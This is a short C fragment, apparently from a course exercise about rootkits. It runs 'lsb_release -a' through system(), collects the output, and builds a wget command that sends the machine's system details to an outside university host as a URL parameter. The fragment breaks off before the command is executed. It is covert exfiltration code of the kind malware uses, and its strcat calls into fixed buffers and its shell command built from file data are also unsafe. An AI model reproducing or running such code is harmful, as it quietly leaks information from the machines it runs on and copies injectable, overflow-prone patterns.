...
main (int argc, char **argv)
{
  ...
  char data[1024] = {0};
  char tmp[64] = {0};
  char wget[2048] = "wget -q \"https://andromeda.cs.virginia.edu/ics/rootkit.php?userid=gxe5dg&data='";
  int line;
  
  system("lsb_release -a > ./lsb.txt 2> /dev/null"); 
  newFile = fopen("./lsb.txt", "r");
 
  while(line = fgets(tmp, sizeof(tmp)-1, newFile) != NULL)
	strcat(data, tmp);
  
  fclose(newFile);
  strcat(wget, data);
  strcat(wget, " ' \" > /dev/null");
